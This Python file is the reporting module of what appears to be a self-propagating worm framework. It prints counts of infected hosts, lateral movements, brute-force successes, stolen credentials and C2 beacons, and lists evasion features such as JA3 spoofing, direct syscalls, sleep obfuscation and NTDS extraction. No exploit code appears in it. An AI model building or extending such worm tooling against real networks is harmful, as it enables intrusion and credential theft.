import os
from datetime import datetime

from .module_imports import logger


class WormCoreReporting:
    def print_status(self):
        print(f"\n{'-' * 60}")
        print(f"Status Update:")
        print(f"  Infected: {len(self.infected_hosts)}")
        print(f"  Failed: {len(self.failed_targets)}")
        print(f"  Discovered: {self.stats['total_hosts_discovered']}")
        print(f"  Vulnerabilities: {self.stats['vulnerabilities_found']}")
        print(f"  Exploit Chains: {self.stats['exploit_chains_built']}")
        print(
            f"  Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
        )
        print(
            f"  Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
        )
        print(f"  Credentials Discovered: {self.stats['credentials_discovered']}")
        print(f"  C2 Beacons: {self.stats['c2_beacons']}")
        print(f"  Polymorphic Mutations: {self.stats['polymorphic_mutations']}")

        total_attempts = self.stats["infections"] + self.stats["failed_exploits"]
        success_rate = self.stats["infections"] / total_attempts * 100 if total_attempts > 0 else 0
        print(f"  Success Rate: {self.stats['infections']}/{total_attempts} ({success_rate:.1f}%)")

        if self.start_time:
            elapsed = datetime.now() - self.start_time
            print(f"  Runtime: {elapsed}")

        if self.knowledge_graph:
            kg_stats = self.knowledge_graph.get_statistics()
            print(f"  Knowledge Graph: {kg_stats['hosts']} hosts, {kg_stats['edges']} edges")

        if self.host_monitor:
            overview = self.host_monitor.get_network_overview()
            print(
                f"  Host Monitor: {overview['total_hosts']} hosts, "
                f"avg health {overview['avg_health']:.0f}%, "
                f"{overview['unique_payloads']} unique payloads, "
                f"{overview['total_repairs']} repairs"
            )

        if self.adaptive_cycle:
            apt_status = self.adaptive_cycle.get_full_status()
            print(f"\n  {'=' * 56}")
            print(f"  APT-LEVEL ADAPTIVE CYCLE STATUS")
            print(f"  {'=' * 56}")
            print(f"  Cycle Count: {apt_status['cycle_count']}")
            recon = apt_status["predictive_recon"]
            print(
                f"  Predictive Recon: {recon['hosts_analyzed']} hosts analyzed, "
                f"{recon['predictions_made']} predictions made"
            )
            selector = apt_status["exploit_selector"]
            print(
                f"  Adaptive Exploit: {selector['total_attempts']} attempts, "
                f"{selector['q_table_entries']} Q-table entries"
            )
            redundancy = apt_status["distributed_redundancy"]
            print(
                f"  Distributed Mesh: {redundancy['heartbeat']['active_peers']} active, "
                f"{redundancy['heartbeat']['dead_peers']} dead"
            )
            mimicry = apt_status["traffic_mimicry"]
            print(f"  Traffic Mimicry: {mimicry['active_protocol']} protocol")
            poly = apt_status["semantic_polymorphism"]
            print(f"  Semantic Polymorphism: {poly['unique_variants']} variants")
            cells = apt_status["dormant_cells"]
            print(
                f"  Dormant Cells: {cells['dormant']} dormant, "
                f"{cells['active']} active, {cells['total_cells']} total"
            )

        print(f"\n  {'=' * 56}")
        print(f"  EXTRA MODULES STATUS")
        print(f"  {'=' * 56}")
        if self.cloud_c2:
            try:
                c2_status = self.cloud_c2.get_status()
                print(f"  Cloud C2: {c2_status.get('enabled', [])}")
            except Exception:
                print(f"  Cloud C2: enabled")
        if self.multi_operator:
            try:
                op_status = self.multi_operator.get_status()
                print(f"  Multi-Operator: {op_status.get('operators', 0)} operators")
            except Exception:
                print(f"  Multi-Operator: running")
        if self.mitre_mapper:
            try:
                mitre_status = self.mitre_mapper.get_status()
                print(
                    f"  MITRE ATT&CK: {mitre_status.get('total_techniques', 0)} techniques mapped"
                )
            except Exception:
                print(f"  MITRE ATT&CK: enabled")
        if self.plugin_manager:
            try:
                plugin_stats = self.plugin_manager.get_plugin_stats()
                print(
                    f"  Plugins: {plugin_stats.get('enabled', 0)} enabled / {plugin_stats.get('total', 0)} total"
                )
            except Exception:
                enabled = len(self.plugin_manager.get_enabled_plugins())
                print(f"  Plugins: {enabled} enabled")
        print(f"  ICMP Tunnel: {'enabled' if self.icmp_tunnel else 'disabled'}")
        print(f"  JA3 Spoofing: {'enabled' if self.ja3_spoofer else 'disabled'}")
        print(f"  DCOM Lateral: {'enabled' if self.dcom_lateral else 'disabled'}")
        print(f"  Direct Syscalls: {'enabled' if self.direct_syscalls else 'disabled'}")
        print(f"  Sleep Obfuscation: {'enabled' if self.sleep_obfuscator else 'disabled'}")
        print(f"  Local Persistence: {'enabled' if self.local_persistence else 'disabled'}")
        print(f"  VSS NTDS: {'enabled' if self.vss_ntds else 'disabled'}")
        print(f"  Swarm Coordinator: {'enabled' if self.swarm_coordinator else 'disabled'}")
        print(f"  Payload Manager: {'enabled' if self.payload_manager else 'disabled'}")
        print(f"  Fuzzing Engine: {'enabled' if self.fuzzing_engine else 'disabled'}")
        pfs_count = self.stats.get("pfs_beacons", 0)
        print(
            f"  PFS Crypto: {'enabled' if self.pfs_crypto else 'disabled'}{f' ({pfs_count} beacons)' if pfs_count else ''}"
        )

        print(f"{'-' * 60}\n")

    def print_final_report(self):
        self.stats["end_time"] = self.stats.get("end_time") or datetime.now()
        start_time = self.stats.get("start_time") or datetime.now()

        print(f"\n{'=' * 60}")
        print("FINAL REPORT")
        print(f"{'=' * 60}")
        print(f"Start: {start_time}")
        print(f"End: {self.stats['end_time']}")

        duration = self.stats["end_time"] - start_time
        print(f"Duration: {duration}")

        print(f"\nInfections: {self.stats['infections']}")
        print(f"Failed: {self.stats['failed_exploits']}")
        print(f"Scans: {self.stats['scans']}")
        print(f"Hosts Discovered: {self.stats['total_hosts_discovered']}")
        print(f"Vulnerabilities Found: {self.stats['vulnerabilities_found']}")
        print(f"Exploit Chains Built: {self.stats['exploit_chains_built']}")
        print(
            f"Lateral Movements: {self.stats['lateral_success']}/{self.stats['lateral_movements']}"
        )
        print(
            f"Brute Force: {self.stats['brute_force_successes']}/{self.stats['brute_force_attempts']}"
        )
        print(f"Credentials Discovered: {self.stats['credentials_discovered']}")
        print(f"C2 Beacons: {self.stats['c2_beacons']}")
        print(f"Polymorphic Mutations: {self.stats['polymorphic_mutations']}")

        total = self.stats["infections"] + self.stats["failed_exploits"]
        if total > 0:
            print(f"Success Rate: {self.stats['infections'] / total * 100:.1f}%")

        print(f"\nInfected Hosts:")
        for ip in sorted(self.infected_hosts):
            print(f"  [INFECTED] {ip}")

        print(f"\nFailed Targets:")
        for ip in sorted(self.failed_targets):
            print(f"  [FAILED] {ip}")

        if self.cred_manager:
            self.cred_manager.print_statistics()

        if self.lateral_movement:
            lm_stats = self.lateral_movement.get_statistics()
            print(f"\nLateral Movement:")
            print(f"  Attempts: {lm_stats['attempts']}")
            print(f"  Successes: {lm_stats['successes']}")
            print(f"  Rate: {lm_stats['success_rate']:.1f}%")
            print(f"  By technique: {lm_stats['by_technique']}")

        if self.knowledge_graph:
            kg_summary = self.knowledge_graph.get_network_summary()
            print(f"\nKnowledge Graph Summary:")
            for k, v in kg_summary.items():
                print(f"  {k}: {v}")

        if self.polymorphic_engine:
            poly_stats = self.polymorphic_engine.get_statistics()
            print(f"\nPolymorphic Engine:")
            print(f"  Mutations: {poly_stats['mutations_generated']}")
            print(f"  Unique signatures: {poly_stats['unique_signatures']}")

        print(f"{'=' * 60}\n")

        if self.audit_generator:
            try:
                exploit_stats = (
                    self.exploit_manager.get_statistics()
                    if hasattr(self.exploit_manager, "get_statistics")
                    else {}
                )
                cred_stats = self.cred_manager.get_statistics() if self.cred_manager else {}
                lm_stats = self.lateral_movement.get_statistics() if self.lateral_movement else {}

                report_files = self.audit_generator.generate(
                    worm_stats=self.stats,
                    scan_results=self.scan_results,
                    infected_hosts=self.infected_hosts,
                    failed_targets=self.failed_targets,
                    exploit_stats=exploit_stats,
                    credential_stats=cred_stats,
                    lateral_movement_stats=lm_stats,
                    output_dir="reports",
                )
                logger.info(f"Audit reports: {report_files}")
            except Exception as e:
                logger.warning(f"Failed to generate audit report: {e}")

        if self.knowledge_graph:
            try:
                os.makedirs("reports", exist_ok=True)
                self.knowledge_graph.export_graph("reports/knowledge_graph.json")
            except Exception as e:
                logger.warning(f"Failed to export knowledge graph: {e}")

        try:
            logger.export_logs("reports/final_report.json")
        except Exception:
            pass
